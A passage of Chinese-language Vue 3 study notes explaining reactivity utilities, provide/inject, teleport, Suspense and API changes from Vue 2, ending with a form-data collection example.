  -  如果有一个对象数据，后续功能不会修改该对象中的属性，而是生新的对象来替换 ===> shallowRef。

### readonly 与 shallowReadonly

- readonly: 让一个响应式数据变为只读的（深只读）。
- shallowReadonly：让一个响应式数据变为只读的（浅只读）。
- 应用场景: 不希望数据被修改时。

### toRaw 与 markRaw

- toRaw：
  - 作用：将一个由```reactive```生成的<strong style="color:orange">响应式对象</strong>转为<strong style="color:orange">普通对象</strong>。
  - 使用场景：用于读取响应式对象对应的普通对象，对这个普通对象的所有操作，不会引起页面更新。
- markRaw：
  - 作用：标记一个对象，使其永远不会再成为响应式对象。
  - 应用场景:
    1. 有些值不应被设置为响应式的，例如复杂的第三方类库等。
    2. 当渲染具有不可变数据源的大列表时，跳过响应式转换可以提高性能。

### customRef

- 作用：创建一个自定义的 ref，并对其依赖项跟踪和更新触发进行显式控制。
- 实现防抖效果：

```vue
<template>
	<input type="text" v-model="keyword">
	<h3>{{keyword}}</h3>
</template>

<script>
	import {ref,customRef} from 'vue'
	export default {
		name:'Demo',
		setup(){
			// let keyword = ref('hello') //使用Vue准备好的内置ref
			//自定义一个myRef
			function myRef(value,delay){
				let timer
				//通过customRef去实现自定义
				return customRef((track,trigger)=>{
					return{
						get(){
							track() //告诉Vue这个value值是需要被“追踪”的
							return value
						},
						set(newValue){
							clearTimeout(timer)
							timer = setTimeout(()=>{
								value = newValue
								trigger() //告诉Vue去更新界面
							},delay)
						}
					}
				})
			}
			let keyword = myRef('hello',500) //使用程序员自定义的ref
			return {
				keyword
			}
		}
	}
</script>
```

### provide 与 inject

- 作用：实现<strong style="color:#DD5145">祖与后代组件间</strong>通信
- 套路：父组件有一个 `provide` 选项来提供数据，后代组件有一个 `inject` 选项来开始使用这些数据
- 具体写法：


```js
// 祖组件中
setup(){
	......
    let car = reactive({name:'奔驰',price:'40万'})
    provide('car',car)
    ......
}
```



```js
// 后代组件中
setup(props,context){
	......
    const car = inject('car')
    return {car}
	......
}
```

### isRef、isReactive、isReadonly、isProxy

- isRef: 检查一个值是否为一个 ref 对象
- isReactive: 检查一个对象是否是由 `reactive` 创建的响应式代理
- isReadonly: 检查一个对象是否是由 `readonly` 创建的只读代理
- isProxy: 检查一个对象是否是由 `reactive` 或者 `readonly` 方法创建的代理

### teleport

`Teleport` 是一种能够将我们的<strong style="color:#DD5145">组件html结构</strong>移动到指定位置的技术。

比如内层嵌套的容器，触发弹窗不好控制位置，可以用`<Teleport >`的to属性，来指定出现在body中或html中

```vue
<template>
	<div>
		<button @click="isShow = true">点我弹个窗</button>
		<teleport to="body">
			<div v-if="isShow" class="mask">
				<div class="dialog">
					<h3>我是一个弹窗</h3>
					<h4>一些内容</h4>
					<h4>一些内容</h4>
					<h4>一些内容</h4>
					<button @click="isShow = false">关闭弹窗</button>
				</div>
			</div>
		</teleport>
	</div>
</template>

<script>
	import {ref} from 'vue'
	export default {
		name:'Dialog',
		setup(){
			let isShow = ref(false)
			return {isShow}
		}
	}
</script>
<style>
	.mask{
		position: absolute;
		top: 0;bottom: 0;left: 0;right: 0;
		background-color: rgba(0, 0, 0, 0.5);
	}
	.dialog{
		position: absolute;
		top: 50%;
		left: 50%;
		transform: translate(-50%,-50%);
		text-align: center;
		width: 300px;
		height: 300px;
		background-color: green;
	}
</style>
```

### Suspense

- 等待异步组件时渲染一些额外内容，让应用有更好的用户体验

```vue
<template>
	<div class="child">
		<h3>我是Child组件</h3>
		{{sum}}
	</div>
</template>

<script>
	import {ref} from 'vue'
	export default {
		name:'Child',
		async setup(){
			let sum = ref(0)
			let p = new Promise((resolve,reject)=>{
				setTimeout(()=>{
					resolve({sum})
				},3000)
			})
			return await p
		}
	}
</script>
```

- 异步引入组件，使用```Suspense```包裹组件，并配置好```default``` 与 ```fallback```

```vue
<template>
	<div class="app">
		<h3>我是App组件</h3>
		<Suspense>
			<template v-slot:default>
				<Child/>
			</template>
			<template v-slot:fallback>
				<h3>稍等，加载中...</h3>
			</template>
		</Suspense>
	</div>
</template>

<script>
	// import Child from './components/Child'//静态引入
	import {defineAsyncComponent} from 'vue' 
	const Child = defineAsyncComponent(()=>import('./components/Child')) //异步引入
	export default {
		name:'App',
		components:{Child},
	}
</script>
```

### 其它改变

**过渡**

```css
/* vue2 */
.v-enter,
.v-leave-to {
  opacity: 0;
}
.v-leave,
.v-enter-to {
  opacity: 1;
}

/* vue3 ---- 加了from */
.v-enter-from,
.v-leave-to {
  opacity: 0;
}

.v-leave-from,
.v-enter-to {
  opacity: 1;
}
```

<strong style="color:#DD5145">移除</strong>keyCode作为 v-on 的修饰符，同时也不再支持```config.keyCodes```

<strong style="color:#DD5145">移除</strong>```v-on.native```修饰符

<strong style="color:#DD5145">移除</strong>过滤器（filter）

将全局的API，即：```Vue.xxx```调整到应用实例（```app```）上

| 2.x 全局 API（```Vue```） | 3.x 实例 API (`app`)                        |
| ------------------------- | ------------------------------------------- |
| Vue.config.xxxx           | app.config.xxxx                             |
| Vue.config.productionTip  | <strong style="color:#DD5145">移除</strong> |
| Vue.component             | app.component                               |
| Vue.directive             | app.directive                               |
| Vue.mixin                 | app.mixin                                   |
| Vue.use                   | app.use                                     |
| Vue.prototype             | app.config.globalProperties                 |

## 小案例

### 收集表单

```
收集表单数据：
	若：<input type="text"/>，则v-model收集的是value值，用户输入的就是value值。
	若：<input type="radio"/>，则v-model收集的是value值，且要给标签配置value值。
	若：<input type="checkbox"/>
			1.没有配置input的value属性，那么收集的就是checked（勾选 or 未勾选，是布尔值）
			2.配置input的value属性:
					(1)v-model的初始值是非数组，那么收集的就是checked（勾选 or 未勾选，是布尔值）
					(2)v-model的初始值是数组，那么收集的的就是value组成的数组
	备注：v-model的三个修饰符：
					lazy：失去焦点再收集数据
					number：输入字符串转为有效的数字
					trim：输入首尾空格过滤
```



```vue
<div id="root">
		<form @submit.prevent="demo">
			账号：<input type="text" v-model.trim="userInfo.account"> <br/><br/>
			密码：<input type="password" v-model="userInfo.password"> <br/><br/>
			年龄：<input type="number" v-model.number="userInfo.age"> <br/><br/>
			性别：
			男<input type="radio" name="sex" v-model="userInfo.sex" value="male">
			女<input type="radio" name="sex" v-model="userInfo.sex" value="female"> <br/><br/>
			爱好：
			学习<input type="checkbox" v-model="userInfo.hobby" value="study">
			打游戏<input type="checkbox" v-model="userInfo.hobby" value="game">
			吃饭<input type="checkbox" v-model="userInfo.hobby" value="eat">
			<br/><br/>
			所属校区
			<select v-model="userInfo.city">
				<option value="">请选择校区</option>
				<option value="beijing">北京</option>
				<option value="shanghai">上海</option>
				<option value="shenzhen">深圳</option>
				<option value="wuhan">武汉</option>
			</select>
			<br/><br/>
			其他信息：
			<textarea v-model.lazy="userInfo.other"></textarea> <br/><br/>
			<input type="checkbox" v-model="userInfo.agree">阅读并接受<a href="http://www.atguigu.com">《用户协议》</a>
			<button>提交</button>
		</form>
	</div>

<script type="text/javascript">
	Vue.config.productionTip = false

	new Vue({
		el:'#root',
		data:{
			userInfo:{
				account:'',
				password:'',
				age:18,
				sex:'female',
				hobby:[],
				city:'beijing',
				other:'',
				agree:''
			}
		},
		methods: {
			demo(){
				console.log(JSON.stringify(this.userInfo))
			}
		}
	})
</script>
```

